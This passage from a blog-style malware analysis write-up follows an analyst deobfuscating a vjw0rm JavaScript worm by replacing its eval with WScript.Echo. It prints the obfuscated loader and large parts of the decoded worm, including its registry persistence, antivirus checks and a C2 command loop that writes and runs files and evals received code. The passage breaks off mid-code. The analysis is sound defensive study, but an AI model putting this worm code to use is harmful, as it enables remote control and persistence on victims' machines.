+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#analysis-take-two" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>I returned to the script with renewed vigour, donned my glasses and ignored that giant chunk of text for the moment. The hot take I learned from my researching travels was to look out for <code>eval</code> statements, and <code>eval</code>s did I look for indeed!</p>
+<p>The original obfuscated sample contained one such statement at the end of the code.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>	<span style="color:#a6e22e">xmlDOM</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">254</span>)] <span style="color:#f92672">=</span> <span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">242</span>), <span style="color:#a6e22e">xmlDOM</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">256</span>)] <span style="color:#f92672">=</span> <span style="color:#a6e22e">superString</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">240</span>)](<span style="color:#e6db74">/&lt;_/g</span>, <span style="color:#e6db74">&#39;A&#39;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">comObject</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">WSH</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">234</span>)](<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">239</span>));
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">_$af1389800</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">_$af1389809</span>();
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">_$af1389800</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">comObject</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">248</span>)] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>, <span style="color:#a6e22e">comObject</span>[<span style="color:#a6e22e">_1</span>(<span style="color:#ae81ff">162</span>)](), <span style="color:#a6e22e">comObject</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">244</span>)](<span style="color:#a6e22e">xmlDOM</span>[<span style="color:#a6e22e">_1</span>(<span style="color:#ae81ff">180</span>)]), <span style="color:#a6e22e">comObject</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">237</span>)] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">comObject</span>[<span style="color:#a6e22e">_8</span>(<span style="color:#ae81ff">458</span>)] <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>, <span style="color:#a6e22e">comObject</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">247</span>)] <span style="color:#f92672">=</span> <span style="color:#a6e22e">_1</span>(<span style="color:#ae81ff">168</span>), eval(<span style="color:#a6e22e">comObject</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">241</span>)]());
+</span></span><span style="display:flex;"><span>}());
+</span></span></code></pre></div><p><em>Figure 4: Eval statement in obfuscated nonsense</em></p>
+<p>Now, the comobjects and xmlDOM should have immediately given away the fact I shouldn&rsquo;t use <code>console.log</code> in this instance to attempt deobfuscation of this script, however, in my gusto I did and thoroughly bamboozled myself for the next few hours, wondering why, exactly the script now hung when I ran it with nodejs. I ended up once again taking a break and pondering my existence and lifes choices a little longer before I arrived at the next attempt.</p>
+<p>comObject, you say? Well lets give WScript a crack and replace that <code>eval</code> statement with <code>WScript.Echo</code> and see what we get.</p>
+<p>I changed the code and opened up powershell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>	<span style="color:#a6e22e">xmlDOM</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">254</span>)] <span style="color:#f92672">=</span> <span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">242</span>), <span style="color:#a6e22e">xmlDOM</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">256</span>)] <span style="color:#f92672">=</span> <span style="color:#a6e22e">superString</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">240</span>)](<span style="color:#e6db74">/&lt;_/g</span>, <span style="color:#e6db74">&#39;A&#39;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">comObject</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">WSH</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">234</span>)](<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">239</span>));
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">_$af1389800</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">_$af1389809</span>();
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">_$af1389800</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">comObject</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">248</span>)] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>, <span style="color:#a6e22e">comObject</span>[<span style="color:#a6e22e">_1</span>(<span style="color:#ae81ff">162</span>)](), <span style="color:#a6e22e">comObject</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">244</span>)](<span style="color:#a6e22e">xmlDOM</span>[<span style="color:#a6e22e">_1</span>(<span style="color:#ae81ff">180</span>)]), <span style="color:#a6e22e">comObject</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">237</span>)] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">comObject</span>[<span style="color:#a6e22e">_8</span>(<span style="color:#ae81ff">458</span>)] <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>, <span style="color:#a6e22e">comObject</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">247</span>)] <span style="color:#f92672">=</span> <span style="color:#a6e22e">_1</span>(<span style="color:#ae81ff">168</span>), <span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">Echo</span>(<span style="color:#a6e22e">comObject</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">241</span>)]());
+</span></span><span style="display:flex;"><span>}());
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>&gt; wscript.exe ./vjworm.js
+</span></span></code></pre></div><p><em>Figure 5: WScript replacement and powershell execution command</em></p>
+<h3 class="relative group">Interjection: The folly of an analyst 
+    <div id="interjection-the-folly-of-an-analyst" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#interjection-the-folly-of-an-analyst" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Now, this seems and feels simple here, but the key piece of information I have left out until this point is <em>slightly embarassing</em>. We&rsquo;ve all done it, but I actually had the syntax wrong for our dear friend WScript. I forgot to capitalise the S in script, which left me with an <code>Undefined Error</code>.</p>
+<p>Classically, instead of actually listening to the sage wisdom of said error, I went on a stackoverflow hunt to solve the bamboozle which served to not really answer anything. A quick break, a look at some <em>legitimate</em> WScript calls in random scripts, and a facepalm later, I changed the command and the darn thing worked.</p>
+<p>Execution of this resulted in a pop up in WScript Host.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">// Coded by v_B01 | Sliemerez -&gt; Twitter : Sliemerez
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">j</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;WScript.Shell&#34;</span>,<span style="color:#e6db74">&#34;Scripting.FileSystemObject&#34;</span>,<span style="color:#e6db74">&#34;Shell.Application&#34;</span>,<span style="color:#e6db74">&#34;Microsoft.XMLHTTP&#34;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">g</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;HKCU&#34;</span>,<span style="color:#e6db74">&#34;HKLM&#34;</span>,<span style="color:#e6db74">&#34;HKCU\\vjw0rm&#34;</span>,<span style="color:#e6db74">&#34;\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\&#34;</span>,<span style="color:#e6db74">&#34;HKLM\\SOFTWARE\\Classes\\&#34;</span>,<span style="color:#e6db74">&#34;REG_SZ&#34;</span>,<span style="color:#e6db74">&#34;\\defaulticon\\&#34;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">y</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;winmgmts:&#34;</span>,<span style="color:#e6db74">&#34;win32_logicaldisk&#34;</span>,<span style="color:#e6db74">&#34;Win32_OperatingSystem&#34;</span>,<span style="color:#e6db74">&#39;AntiVirusProduct&#39;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">sh</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Cr</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fs</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Cr</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">spl</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;|V|&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">Ch</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;\\&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">VN</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;9/21&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;_&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">Ob</span>(<span style="color:#ae81ff">6</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fu</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">ScriptFullName</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wn</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">ScriptName</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">U</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">U</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">RegRead</span>(<span style="color:#a6e22e">g</span>[<span style="color:#ae81ff">2</span>]);
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">err</span>) {
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">sv</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fu</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;\\&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#e6db74">&#34;:\\&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">sv</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;:\\&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">wn</span>) {
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">U</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;TRUE&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">RegWrite</span>(<span style="color:#a6e22e">g</span>[<span style="color:#ae81ff">2</span>],<span style="color:#a6e22e">U</span>,<span style="color:#a6e22e">g</span>[<span style="color:#ae81ff">5</span>]);
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">U</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;FALSE&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">RegWrite</span>(<span style="color:#a6e22e">g</span>[<span style="color:#ae81ff">2</span>],<span style="color:#a6e22e">U</span>,<span style="color:#a6e22e">g</span>[<span style="color:#ae81ff">5</span>]);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Ns</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">P</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Pt</span>(<span style="color:#e6db74">&#39;Vre&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">P</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">P</span>.<span style="color:#a6e22e">split</span>(<span style="color:#a6e22e">spl</span>);
+</span></span></code></pre></div><p><em>Figure 6: WScript Output received through execution of file</em></p>
+<p>Well, well, well. This definitely looks a lot better than our first attempt via base64 decoding. The variables are all there and there is no funky encoding dramas this time around. I decided to run the command again, piping the output of the command into a file on disk to investigate further.</p>
+<pre tabindex="0"><code># moved to cscript to execute so it boops into a file. 
+# comparing the pair, I also just like cscript output better... 
+
+&gt; cscript.exe .\vjworm_2.js &gt; vjworm_3.js
+</code></pre><p>The output looks much better now. All of the variables look readable (whilst horribly formatted at present). Now time to figure out each variable in turn.</p>
+<h3 class="relative group">The Analysis&hellip; deepens? 
+    <div id="the-analysis-deepens" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#the-analysis-deepens" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>In this section, we will be looking at each segment of the JS code and attempting to make each function human readable. The objective of this exercise is to clearly figure out:</p>
+<ul>
+<li>Where the malware persists</li>
+<li>C2 communications</li>
+<li>Any additional functions of the malware</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">sh</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Cr</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fs</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Cr</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">spl</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;|V|&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">Ch</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\\&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">VN</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;9/21&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;_&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">Ob</span>(<span style="color:#ae81ff">6</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fu</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">ScriptFullName</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wn</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">ScriptName</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">U</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">U</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">RegRead</span>(<span style="color:#a6e22e">g</span>[<span style="color:#ae81ff">2</span>]);
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">err</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">sv</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fu</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;\\&#39;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#e6db74">&#39;:\\&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">sv</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;:\\&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">wn</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">U</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;TRUE&#39;</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">RegWrite</span>(<span style="color:#a6e22e">g</span>[<span style="color:#ae81ff">2</span>], <span style="color:#a6e22e">U</span>, <span style="color:#a6e22e">g</span>[<span style="color:#ae81ff">5</span>]);
+</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">U</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;FALSE&#39;</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">RegWrite</span>(<span style="color:#a6e22e">g</span>[<span style="color:#ae81ff">2</span>], <span style="color:#a6e22e">U</span>, <span style="color:#a6e22e">g</span>[<span style="color:#ae81ff">5</span>]);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><em>Figure 7: Hard to read, arguably still &lsquo;obfuscated&rsquo; script</em></p>
+<p>To make reading this sample more confusing, global variables and arrays are defined at the beginning of this script making it harder to read. The variables that follow contain values that are very hard to make sense of. I worked logically through each function to change these values to make them easier to read. I have included examples of this in Figure 8 below.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">reg_key_installed</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">RegRead</span>(<span style="color:#e6db74">&#39;HKCU\\vjw0rm&#39;</span>);
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">err</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">sv</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">ScriptFullName</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;\\&#39;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#e6db74">&#39;:\\&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">sv</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;:\\&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">ScriptName</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">reg_key_exists</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;TRUE&#39;</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">RegWrite</span>(<span style="color:#e6db74">&#39;HKCU\\vjw0rm&#39;</span>, <span style="color:#a6e22e">reg_key_installed</span>, <span style="color:#e6db74">&#39;REG_SZ&#39;</span>);
+</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">reg_key_exists</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;FALSE&#39;</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">RegWrite</span>(<span style="color:#e6db74">&#39;HKCU\\vjw0rm&#39;</span>, <span style="color:#a6e22e">reg_key_installed</span>, <span style="color:#e6db74">&#39;REG_SZ&#39;</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><em>Figure 8: De-bamboozled, easier to read script showing persistence</em></p>
+<p>Once this section of code is made readable it reveals the primary persistence mechanism for this variant of vjw0rm. The malware will check to see whether the registry value of <code>HKCU\\vjworm</code> is present.</p>
+<p>Note: you could name these variables whatever you want, I just named them something that made sense to my weird brain.</p>
+<p>I continued to move through the script, deobfuscating the commands as I went. This way I was able to make sense of the functions of the malware.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">path</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Pt</span>(<span style="color:#e6db74">&#39;Vre&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>); <span style="color:#75715e">// directory that is appended to the C2
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">path</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">split</span>(<span style="color:#a6e22e">spl</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">path</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;Cl&#39;</span>) {
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">Quit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">path</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;Sc&#39;</span>) {    
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">s2</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Ex</span>(<span style="color:#e6db74">&#39;temp&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\\&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">path</span>[<span style="color:#ae81ff">2</span>];
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fi</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">CreateTextFile</span>(<span style="color:#a6e22e">s2</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fi</span>.<span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">path</span>[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fi</span>.<span style="color:#a6e22e">Close</span>();
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">run</span>(<span style="color:#a6e22e">s2</span>);
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">path</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;Ex&#39;</span>) {
+</span></span><span style="display:flex;"><span>			eval(<span style="color:#a6e22e">path</span>[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">path</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;Rn&#39;</span>) {
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ri</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">OpenTextFile</span>(<span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">ScriptFullName</span>, <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ri</span>.<span style="color:#a6e22e">ReadAll</span>();
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">ri</span>.<span style="color:#a6e22e">Close</span>();
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">VN</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">VN</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;_&#39;</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fr</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#a6e22e">VN</span>[<span style="color:#ae81ff">0</span>], <span style="color:#a6e22e">path</span>[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wi</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">OpenTextFile</span>(<span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">ScriptFullName</span>, <span style="color:#ae81ff">2</span>, <span style="color:#66d9ef">false</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">wi</span>.<span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">fr</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">wi</span>.<span style="color:#a6e22e">Close</span>();
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">run</span>(<span style="color:#e6db74">&#39;wscript.exe //B &#34;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">ScriptFullName</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34;&#39;</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">Quit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">path</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;Up&#39;</span>) {
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">s2</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Ex</span>(<span style="color:#e6db74">&#39;temp&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\\&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">path</span>[<span style="color:#ae81ff">2</span>];
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ctf</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">CreateTextFile</span>(<span style="color:#a6e22e">s2</span>, <span style="color:#66d9ef">true</span>);
